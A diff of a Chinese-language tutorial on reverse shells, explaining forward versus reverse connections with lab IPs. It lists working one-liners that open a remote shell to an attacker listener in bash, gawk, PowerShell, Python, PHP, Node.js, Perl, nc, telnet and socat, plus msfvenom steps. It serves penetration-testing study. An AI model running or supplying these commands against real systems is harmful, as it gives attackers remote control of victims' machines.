@@ -4,10 +4,12 @@
     反向连接 = 反弹shell = 反向shell = 反弹壳 = 反弹外壳
 ### 正向Shell(连接):    (攻击机主动连接受害主机)
 受害主机监听一个端口，**攻击者主动连接受害主机**（目标ip：目标机器端口），适用于受害主机有公网IP的情况。远程桌面、web服务、ssh、telnet等等都是正向连接。
+
 ![alt text](images/image1.png)
 
 ### 反向Shell(连接):   (受害主机出网来主动连接攻击机)
 反向连接则是，攻击者指定服务端并监听某端口的tcp/UDP连接，受害主机主动(<mark>这种主动在于执行了一些攻击者的命令等</mark>)发送连接请求到该端口，并将其输入输出转换到服务端。
+
 ![alt text](images/image2.png)
 
 反弹shell(reverse shell)与telnet，ssh等标准shell对应，<mark>本质上是网络概念的客户端与服务端的角色反转.</mark>
@@ -37,6 +39,7 @@
 ##### 1.1.1 操作步骤
 
 攻击机利用nc监听`7777`端口(自己定)：
+
 ![alt text](images/image3.png)
 
 然后在受害机上执行以下命令:
@@ -45,6 +48,7 @@ bash -i >& /dev/tcp/192.168.59.1/7777 0>&1
 ```
 
 然后给攻击机成功拿到shell：
+
 ![alt text](images/image4.png)
 
 ##### 1.1.2 命令解析
@@ -79,6 +83,7 @@ if __name__ == '__main__':
 ![alt text](images/image7.png)
 
 可以拿到反弹shell：
+
 ![alt text](images/image8.png)
 
 ##### 1.2.2 原理解析
@@ -89,6 +94,7 @@ if __name__ == '__main__':
 ##### 1.3.1 操作步骤
 
 攻击机监听`7777`端口，然后受害主机执行`exec 5<>/dev/tcp/192.168.59.1/7777;cat <&5 | while read line; do $line 2>&5 >&5;done`：
+
 ![alt text](images/image9.png)
 
 ##### 1.3.2 原理分析
@@ -111,6 +117,7 @@ awk 是一种文本处理工具，可以用于处理文本文件中的数据。
 ```shell
 gawk 'BEGIN{s="/inet/tcp/0/192.168.59.1/7777";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
 ```
+
 ![alt text](images/image10.png)
 
 ##### 1.4.2 原理分析<sup>[4][5]</sup>
@@ -128,6 +135,7 @@ gawk 'BEGIN{s="/inet/tcp/0/192.168.59.1/7777";for(;s|&getline c;close(c))while(c
 #### 2.1 Powershell反弹
 ##### 操作步骤
 攻击机利用nc监听9999端口：
+
 ![alt text](images/image11.png)
 
 然后受害机上执行如下命令：
@@ -140,12 +148,25 @@ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 #### 2.2 MSF反弹
+使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们可能需要的payload
 
+![alt text](images/image28.png)
+
+然后生成命令：
+
+![alt text](images/image29.png)
+
+然后msf启动监听：
+
+![alt text](images/image30.png)
+
+将上述生成的代码复制到win7的powershell中执行即可，但是我在win11上没有执行成功
 
 ### 3. 编程语言反弹shell
 #### 3.1 python反弹shell
 ##### 3.1.1 操作步骤
 攻击机利用nc监听9999端口：
+
 ![alt text](images/image11.png)
 
 受害机执行：
@@ -154,6 +175,7 @@ python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 
 得到如下结果：
+
 ![alt text](images/image12.png)
 
 或者在攻击机下在http服务目录下创建一个python文件，内容如下。其中一般都在vps上部署
@@ -170,6 +192,7 @@ p=subprocess.call(["/bin/sh","-i"])
 ```
 
 然后开启http服务，受害机请求该py文件：
+
 ![alt text](images/image13.png)
 ![alt text](images/image14.png)
 
@@ -200,6 +223,7 @@ p=subprocess.call(["/bin/sh","-i"])
 ```php
 php -r 'exec("/usr/bin/bash -i >& /dev/tcp/172.26.80.185/9999 0>&1");'
 ```
+
 ![alt text](images/image15.png)
 ![alt text](images/image16.png)
 
@@ -219,6 +243,7 @@ exec("/bin/sh -i <&3 >&3 2>&3");
 攻击机开启http服务，并将nodejsshell.js放在目录下，监听9999端口.
 
 然后装有nodejs环境的攻击机访问上面的文件：
+
 ![alt text](images/image17.png)
 ![alt text](images/image18.png)
 
@@ -250,6 +275,7 @@ exec("/bin/sh -i <&3 >&3 2>&3");
 ```shell
 perl -e 'use Socket;$i="172.26.80.185";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
+
 ![alt text](images/image20.png)
 
 ##### 3.4.2 原理分析
@@ -278,6 +304,7 @@ if(connect(S,sockaddr_in($p,inet_aton($i))))
 ```shell
 nc -e /bin/bash 172.26.80.185 9999
 ```
+
 ![alt text](images/image21.png)
 ![alt text](images/image22.png)
 
@@ -288,6 +315,7 @@ nc -nvlp 7654		#输出命令
 
 受害者：
 telnet 192.168.59.128 4567 | /bin/bash | telnet 192.168.59.128 7654
+
 ![alt text](images/image23.png)
 ![alt text](images/image24.png)
 ![alt text](images/image25.png)
@@ -298,6 +326,7 @@ telnet 192.168.59.128 4567 | /bin/bash | telnet 192.168.59.128 7654
 攻击者：nc -nvlp 9999
 
 受害者：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.59.128 4567:9999
+
 ![alt text](images/image26.png)
 ![alt text](images/image27.png)
 
